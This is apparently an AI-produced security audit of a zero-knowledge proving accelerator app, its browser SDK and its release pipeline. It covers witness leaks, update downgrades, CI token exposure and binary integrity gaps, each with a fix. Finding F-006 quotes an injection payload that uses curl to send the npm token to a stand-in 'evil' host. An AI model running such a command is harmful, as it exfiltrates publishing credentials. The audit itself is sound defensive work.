Executive summary

Ten areas of the codebase were each audited twice — once by a Claude agent and once by a Codex agent, 20 independent passes — with extra weight on the three things you asked about: privacy leaks, cryptography, and the witness (the secret inputs to a zero-knowledge proof, which if leaked would deanonymize an otherwise-private transaction). The headline is that this is a well-built application: the anti-DNS-rebinding guard, the deny-by-default site-approval model, the one-time approval tokens, and the fail-closed binary-download checks in the running app all survived direct attack. Most areas produced only one or two findings; several produced none. There are no Critical issues — nothing here lets a random website on the internet attack a user with no local foothold.

The real findings gather around two stories. The first is trust between the browser SDK and the local app: the SDK will hand the secret witness to whatever program answers on the expected local port, without ever checking it is the genuine accelerator (F-001) — and a second bug lets a hostile local program push the real app out and take that port (F-002). A third, simpler witness bug: the app writes the witness to a temporary file that other users on the same machine can read while a proof runs (F-003). The second story is the update and release pipeline: the auto-updater can be tricked into installing an older, still-validly-signed version that has known bugs (F-004); the cloud role that publishes releases can rewrite the update feed from unprotected branches (F-005); a publish workflow can be made to leak its npm token (F-006); and the bb proving binary has two integrity gaps in its setup scripts (F-007, F-008).

Priorities: fix the SDK↔app identity pair (F-001 + F-002) and the update pair (F-004 + F-005) as design work, and land the three cheap, certain fixes (F-003, F-006, F-009) immediately. Every High finding requires either a program already running on the user's machine or control of the project's CI/update infrastructure — important context for how urgently to treat them.

Cheapest fixes first (land these in the first PR). F-003 — add one line so the witness temp file/dir is owner-only (0o600/0o700); the app already does exactly this for its config and cert files. F-006 — pass the workflow's dist_tag input through env: and quote it, instead of pasting it straight into a shell command. F-009 — take the "one proof at a time" lock before reading the 50 MB request body, not after.
Ship together. F-001 + F-002 are the same missing idea — neither the SDK nor the app authenticates the other end on the local port; fixing one without the other still leaves a program able to receive the witness. F-004 + F-005 compound — F-005 is the concrete way an attacker reaches the update feed that F-004 then abuses to force a downgrade; patch the feed's write-access and the version-binding in the same effort. F-007 + F-008 are both bb-binary integrity gaps in the download/pin tooling — fix them as one supply-chain pass.

Findings

High F-001 SDK sends the private witness to an unauthenticated local server
Found by Claude+Codex confidence: high CWE-306 fix: days couples with F-002

What it is. To speed up proofs, the browser SDK looks for the accelerator app on a fixed local address and, if something answers a simple health check, sends it the witness — the private inputs to the proof. The SDK never confirms that the thing answering is actually the real accelerator. Any reply counts, even an empty one, and even a version it doesn't recognize still gets the witness.

What an attacker would do. Run a small program on the victim's machine that grabs the expected local port before the real app does and answers the health check. The next time the user's dApp makes a proof, the SDK sends the private witness to the attacker's program, which quietly keeps a copy. That copy is enough to deanonymize a transaction that was supposed to be private.

The fix. Have the SDK prove it is talking to the genuine app before sending anything sensitive — pin the app's certificate/public key, or share a small secret token through the app's owner-only data folder that the SDK checks. And if the health response is unrecognized or an old version, fall back to local proving instead of sending the witness.

Technical trace

Instances: packages/sdk/src/lib/accelerator-transport.ts:112,116,148; packages/sdk/src/lib/accelerator-prover.ts:177,194,262,273,299,309

Trace: createChonkProof() (prover:262) → status check (:273) → unauthenticated GET /health (transport:112), first-win Promise.any (:116) pins protocol (prover:194); a bare {} body reaches the legacy "available" path (prover:177). Witness serialized (prover:299) → POST {baseUrl}/prove (transport:148). No cert-pin / shared-secret / attestation anywhere.

Fix: mutual identity via pinned self-signed cert or per-install token from the app's 0o700 data dir; treat unrecognized/legacy /health as not-available (WASM fallback).

High F-004 Auto-updater can be forced to install an older, signed-but-vulnerable build
Found by Claude+Codex confidence: high CWE-347 fix: days couples with F-005

What it is. The updater cryptographically checks that an update file is genuinely signed by the project — that part is solid. But the "is this newer than what I have?" decision reads a version number from the update feed that is not tied to the signed file. So the feed can claim a huge version number while handing over an old file that is still validly signed.

What an attacker would do. Whoever can edit the update feed (see F-005 for how) advertises version 999.0.0 but points the download at a genuine older release that has since-fixed security bugs. The signature checks out, the version looks newer, and the app downgrades itself — silently, for users with auto-update on — reopening whatever those old bugs were.

The fix. After downloading, check that the file's own embedded version matches the feed's claimed version and is strictly newer than what's installed; remember the highest version ever installed and refuse to go below it. Fix the feed's access control at the same time (F-005).

Technical trace

Instances: packages/accelerator/src-tauri/src/updater.rs:27,39-56,126-137,170

Trace: feed update.version drives the newer-check (updater.rs:39-41) but is never compared to the downloaded artifact; update.install(bytes) (:170) accepts any validly-signed (possibly older) build. minisign authenticates bytes, not version→artifact binding. No monotonic floor.

Fix: post-download assert embedded-version == feed-version && > installed; persist a rollback floor. Platform installers (MSI) may add their own downgrade guard — don't rely on it cross-platform.

Medium F-002 A fake local server can evict the real accelerator and keep its port (Windows)
Found by Claude+Codex confidence: high CWE-287 fix: hours–days couples with F-001

What it is. When the accelerator starts and finds the port already taken, it pings the health endpoint to decide "is that just another copy of me?" — and if the answer looks like a healthy accelerator, it quietly exits. But that health answer is public and trivial to fake.

What an attacker would do. Start a hostile program first, bind the port, and answer the health check like a real accelerator. On Windows, the genuine app then decides it's redundant and exits — handing the port to the attacker, who now receives the witnesses that F-001's SDK will send. It turns "you need to already be running" into "just start first."

The fix. Before self-terminating, confirm the existing listener is really the accelerator — e.g. a per-install secret, a named-pipe/OS identity check, or a signed challenge — not just a public JSON shape anyone can echo.

Technical trace

Instances: packages/accelerator/core/src/server/probe.rs:14-17,24-44; packages/accelerator/src-tauri/src/main.rs:238-245

Trace: probe accepts any 2xx with status=="ok" & api_version==1 (probe.rs:14-17) → positive probe → exit(0) (main.rs:238-245). Impostor keeps the port.

Fix: authenticate the incumbent (shared secret / IPC identity / signed challenge) before exiting.

Medium F-003 Private witness written to a world-readable temp file during proving
Found by Claude (verified) confidence: high CWE-200 / CWE-732 fix: hours · CHEAPEST

What it is. To run a proof, the app writes the witness to a temporary file and points the bb proving tool at it. That file — and its folder — are created with default permissions, which on a typical Linux machine means any user on the system can read them. (We confirmed this by reading the actual tempfile library source: its temp-directory helper does not lock down permissions unless you explicitly ask it to.)

What an attacker would do. On a shared machine — a dev server, a CI runner, or a homelab running many processes — a second local user watches the temp folder and copies the witness file during the few minutes a proof runs. No special privileges needed. The app already gets this right for its config and certificate files (owner-only); this one spot was missed.

The fix. Create the temp directory owner-only and write the file 0o600 — mirror the 0o700/0o600 pattern already used in config.rs and certs.rs. One or two lines.

Technical trace

Instances: packages/accelerator/core/src/bb.rs:86-90

Trace: tempfile::tempdir() (bb.rs:86) → verified against tempfile 3.27.0 src/dir/imp/unix.rs::create: dir mode is set only if the caller passes permissions; tempdir() passes None → umask-default (~0o755). std::fs::write(&input_path, ivc_inputs) (bb.rs:90) → file ~0o644. Readable by other local users for ≤5 min. Neutralized only by a hardened umask (077).

Fix: tempfile::Builder::new().permissions(Permissions::from_mode(0o700)).tempdir() and write the file 0o600.

Medium F-005 Release role can rewrite the update feed & site from unprotected branches
Found by Claude+Codex confidence: high CWE-269 fix: hours–days couples with F-004

What it is. The cloud (AWS) role that CI uses to publish releases trusts GitHub identities from branch-name patterns (chore/aztec-stable-*, chore/aztec-nightlies-*) and the nightlies branch — but branch-protection rules only cover main. That role can write to the entire hosting bucket, including releases/latest.json, the file the auto-updater trusts.

What an attacker would do. Anyone who can push one of those unprotected branches and run a workflow (in this solo repo: the owner, or a stolen owner/CI token — not an anonymous outsider) obtains the deploy credentials and rewrites the update feed (enabling the F-004 downgrade) or defaces the landing/playground pages. The release signature still blocks shipping brand-new malware, but not downgrade, denial-of-service, or phishing.

The fix. Restrict the cloud trust to protected refs only; protect the nightlies and chore/aztec-* branches; give each pipeline write access only to its own folder in the bucket (releases vs landing vs playground); require at least one review on main.

Technical trace

Instances: infra/tofu/iam.tf:32-38,53-72; infra/rulesets/main-branch-protection.json:6-20; .github/workflows/publish-nightlies.yml:69-82; .github/workflows/release-accelerator.yml:809-824

Trace: OIDC sub StringLike chore/aztec-*-* (iam.tf:32-38); protection covers only main (0 approvals); role gets bucket-wide PutObject/DeleteObject + CloudFront invalidation (iam.tf:53-72), writing landing/releases/latest.json (release-accelerator.yml:815).

Fix: scope sub to protected refs; protect the wildcard/nightlies branches; per-prefix S3 policy; ≥1 review on main.

Medium F-006 Publish workflow input is pasted into a shell command with tokens present
Found by Codex (verified) confidence: high CWE-78 fix: hours · CHEAPEST

What it is. The reusable "Publish SDK" workflow takes a text input (dist_tag) and drops it, unquoted, directly into shell commands that run with the npm publish token and a GitHub token in the environment.

What an attacker would do. Someone able to run that workflow by hand (a collaborator, or a stolen token) sets dist_tag to something like x; curl -d "$NODE_AUTH_TOKEN" https://evil. GitHub pastes it into the command before the shell runs, so the injected part executes and exfiltrates the npm token — enough to publish a malicious version of the package to every consumer.

The fix. Pass the input through an env: variable and reference it quoted ("$DIST_TAG"), and validate it against a strict allowlist like ^[a-z0-9._-]+$.

Technical trace

Instances: .github/workflows/_publish-sdk.yml:101,108,124,126

Trace: line 101 npm publish … --tag ${{ inputs.dist_tag }} (unquoted, NODE_AUTH_TOKEN in env); line 124 same expression inside a double-quoted NOTES= in a step with GH_TOKEN. GitHub expands ${{ }} before bash runs → command/substitution injection.

Fix: env: DIST_TAG: ${{ inputs.dist_tag }} then "$DIST_TAG"; validate format.

Medium F-007 A helper script fills the trusted bb cache with no integrity check
Found by Claude+Codex confidence: high CWE-494 fix: hours couples with F-008

What it is. The running app downloads the bb proving binary carefully — it checks a SHA-256 digest and refuses anything that doesn't match. But a separate developer script, bb:download, downloads the same binary into the same cache folder with no check at all. And the app, when it sees a binary already in the cache, trusts it and runs it without re-checking.

What an attacker would do. Tamper with the download (a compromised release, or a network man-in-the-middle) while someone runs bun run bb:download. The bad binary lands in the trusted cache; later, when a proof runs, the app executes it and it reads/exfiltrates the witness it was handed.

The fix. Give the script the same fail-closed SHA-256 check the Rust runtime already uses — or have the runtime verify a recorded digest on every cache hit instead of trusting that a file merely exists.

Technical trace

Instances: scripts/download-bb.ts:32-106; packages/accelerator/core/src/versions/cache_layout.rs:7-30; packages/accelerator/core/src/server/prove.rs:75; packages/accelerator/core/src/bb.rs:31-35

Trace: download-bb.ts fetch + tar -xzf with no digest → ~/.aztec-accelerator/versions/{version}/bb (same layout as cache_layout.rs); runtime cache-hit short-circuit (prove.rs:75 / find_bb) executes it without verify_digest.

Fix: mirror the Rust fail-closed SHA-256 check in the script, or verify a persisted digest marker on cache hit.

Medium F-008 Windows bb.exe checksum is auto-pinned from whatever the download returns
Found by Claude+Codex confidence: high CWE-494 fix: hours–days couples with F-007

What it is. For the Windows build, the code "pins" the expected checksum of bb.exe — but the pin is generated automatically by hashing whatever the release URL returned at update time, and it merges with zero required reviews. So the checksum guarantees only "matches the first thing we downloaded," not "matches a known-good binary."

What an attacker would do. Compromise the upstream Windows asset at the moment a maintainer runs the version-update script. The script hashes the malicious file and writes that hash in as the trusted pin; later builds "verify" against it and pass, shipping the malicious bb.exe — which processes witnesses — to every Windows user of that release.

The fix. Derive the checksum from an independent source (upstream signed checksums, a second mirror, or a reproducible build) and require a human to review checksum changes.

Technical trace

Instances: scripts/update-aztec-version.ts:79-93,137; packages/accelerator/scripts/copy-bb.ts:56-148

Trace: update-aztec-version.ts hashes the fetched tarball and writes it into WINDOWS_BB_CHECKSUMS; copy-bb.ts later verifies against that self-derived pin. 0 required reviews → auto-pin merges unreviewed. The "review-gated pin" comment is contradicted by live branch protection.

Fix: independent checksum source + mandatory human review of pin diffs.

Medium F-009 /prove buffers the whole 50 MB body before the concurrency limit (memory DoS)
Found by Codex (verified) confidence: high CWE-770 fix: hours · CHEAPEST

What it is. The proving endpoint limits itself to one proof at a time. But it reads the entire request body (up to 50 MB) into memory before taking that "one at a time" lock, so many requests can pile up, each holding 50 MB, all waiting for the single slot.

What a user/attacker would trigger. An already-approved (or local) dApp fires hundreds of concurrent 50 MB requests. Each is accepted, buffered, and queued — consuming gigabytes of memory before any proof even starts — until the app or desktop session becomes unstable or crashes.

The fix. Take the concurrency permit (or a bounded memory budget / connection cap) before reading the body, or stream the body to the temp file only once the permit is held.

Technical trace

Instances: packages/accelerator/core/src/server/prove.rs:110,112,121

Trace: authorize (:110) → to_bytes(raw_body, 50MB) (:112) → prove_semaphore.acquire() (:121). Buffer precedes the gate; N concurrent requests hold N×50 MB.

Fix: acquire the permit / memory budget before buffering; or stream under the permit.

Low F-010 Linux crash-recovery writes an unescaped exe path into a systemd unit
Found by Claude+Codex confidence: moderate CWE-74 fix: hours

What it is. When enabling autostart on Linux, the app writes its own program path into a systemd service file without escaping it. The Windows equivalent already escapes its path; Linux doesn't.

What an attacker would do. If they can get the app to run from a path containing quotes or newlines, they can inject extra service directives that systemd will execute at the user's privilege on next start. The precondition (running from an attacker-named path) is unusual for a normally-installed app, so impact is low.

The fix. Reject control characters in the path, or apply proper systemd escaping — mirror what the Windows path already does.

Low F-011 Trailing-dot origins collapse into an already-approved origin
Found by Codex (verified) confidence: high (code) / low (exploit) CWE-863 fix: hours

What it is. When normalizing a website's origin, the code strips a trailing dot from the hostname, so https://site.example. is treated as the already-approved https://site.example. Browsers consider those two different origins.

What an attacker would do. Serve a page whose origin is the trailing-dot form of a trusted site and skip the approval prompt (and even borrow the "verified" badge). In practice the dotted name almost always resolves to the same real server, so an attacker rarely controls its content — which is why this is low, not medium.

The fix. Reject trailing-dot origins (don't silently strip the dot) so they must be approved on their own.

Technical trace

Instances: packages/accelerator/core/src/authorization.rs:37

Trace: host.trim_end_matches('.') merges https://x. into approved https://x before authz, display, persistence, and verified-site lookup.

Fix: reject trailing-dot hosts in canonicalize_origin.

Low F-012 All IPC commands are globally reachable and no CSP is set (defense-in-depth)
Found by Codex confidence: high (architecture) CWE-1021 / CWE-862 fix: hours

What it is. Every backend command is exposed to every app window, there's no Content-Security-Policy, and the global Tauri bridge is on. Today the app's own pages are safe (they only render text, never raw HTML), so there's no way in — this is a resilience gap, not a live bug.

What an attacker would do. If any future change introduced an HTML-injection bug in an app window, that injected script could call trust-changing commands — approve its own origin, disable auto-updates, remove approved sites — because nothing scopes commands to the window that should use them.

The fix. Set a strict CSP, turn off the global bridge (withGlobalTauri), and scope each command to the window that needs it, so a single injection can't reach the whole command surface.

Technical trace

Instances: packages/accelerator/src-tauri/src/main.rs:447-460; packages/accelerator/src-tauri/tauri.conf.json (no app.security.csp; withGlobalTauri:true)

Trace: one global invoke_handler; no per-window capability scoping; no CSP. No current injection sink (frontend uses textContent/createElement only).

Fix: strict CSP, drop withGlobalTauri, per-window command scoping.

Low F-013 Headless mode auto-approves every localhost origin regardless of allowlist
Found by Claude (verified) confidence: high CWE-863 fix: hours

What it is. When the headless server runs with an ALLOWED_ORIGINS restriction, it still auto-approves any origin claiming to be localhost (any port). This is documented as intentional (there's no approval popup in headless mode), but it means the operator's allowlist doesn't actually restrict localhost callers.

What an attacker would do. On a shared/CI host, any other local process presents an Origin: http://localhost:NNNN and submits proving jobs, bypassing the allowlist the operator set to lock things down.

The fix. Make localhost auto-approval an explicit opt-in for headless, so an operator who sets an allowlist gets exactly what they asked for.

Low F-014 Approve popup overflows on a very long origin; "Remember" is pre-checked
Found by Claude (verified, downgraded) confidence: high CWE-451 fix: hours

What it is. The site-approval popup is a fixed-size, non-scrolling window. A very long origin wraps and overflows it, so the origin box and/or the Allow/Deny buttons can get clipped off-screen — and "Remember this site" is already ticked.

What an attacker would do. Present a long, confusing origin so the trust-relevant part (the real registrable domain) is pushed out of view when the user makes an approve/deny decision. Because the text wraps rather than cleanly truncating, all characters are technically present — which is why this is low, not medium.

The fix. Truncate with a middle-ellipsis that always keeps the registrable domain visible, let the popup scroll, and default "Remember" to unchecked.

Low F-016 Localhost CA signing key is not explicitly zeroized from memory
Found by Claude confidence: moderate CWE-212 fix: hours

What it is. The app generates a short-lived certificate authority (CA) key in memory to sign its localhost HTTPS certificate, and deliberately never writes it to disk — a good design. It enables the crypto library's "zeroize" feature but never actually calls it, and whether the library scrubs the underlying key material on its own isn't verifiable from this repo.

What an attacker would do. An attacker who can already read the app's process memory (via a core dump, ptrace, or swap — which needs the same user or root) might recover the CA key and mint fake localhost certificates. Because that attacker already has high privilege and the CA is limited to localhost names, the extra gain is small.

The fix. Wrap the key material in a Zeroizing container or confirm the library scrubs it on drop; document the residual in-memory window.

Technical trace

Instances: packages/accelerator/src-tauri/src/certs.rs (no .zeroize() call); packages/accelerator/src-tauri/Cargo.toml:53 (rcgen zeroize feature)

Trace: keyless-CA design; feature enabled but never invoked; rcgen 0.13 Drop scrubbing coverage (ring/aws-lc key vs outer DER) unverified here. Requires local memory read; CA NameConstraint-scoped to localhost.

Fix: Zeroizing wrapper / confirm ZeroizeOnDrop coverage.

Cross-cutting observations

The SDK ↔ accelerator channel has no mutual identity

F-001, F-002, and F-011 are three faces of one habit: trusting a party that was never authenticated. The SDK trusts any local program that answers the health check; the app trusts any local program already holding its port; the origin comparator trusts a normalized string. A single design decision closes most of it — a per-install identity (a pinned key or token kept in the app's owner-only data folder) that the SDK uses to authenticate the server and the app uses to authenticate an existing instance. That one mechanism resolves F-001 and F-002 and makes the F-011 string-collapse far less consequential.

The witness is guarded in transit but not at rest

The app does the hard privacy work well — deny-by-default authorization, generic error messages that never echo internal paths, and no witness bytes in logs. The single gap (F-003) is one missing permission flag on the one place the witness touches disk. It's an hour of work, and it matters more than its severity band suggests for a tool whose entire purpose is privacy.

The update & deploy path concentrates trust

F-004 (version not bound to the signed file), F-005 (whole-bucket write from unprotected branches), F-006 (an injectable token-bearing workflow), F-008 (a self-derived checksum pin), and F-015 (mutable action tags) are independent but compounding — each widens what a single stolen CI or owner credential can accomplish, from "publish one bad thing" toward "control the update channel and the hosted site." Tightening the cloud trust scope, splitting bucket write-access by folder, and binding update version to the signed artifact shrink the whole blast radius together, and are worth treating as one hardening initiative.

A small consistency gap: verified-site display names aren't validated

The curated verified-sites.json validates the origin field as ASCII but applies no such guard to the human-readable displayName, so a Trojan-Source-style bidirectional or zero-width payload could slip past single-curator review. Impact is minor — the raw origin is always shown as ground truth alongside the name — but a one-line ASCII/bidi check on displayName mirrors the guard the sibling field already has.
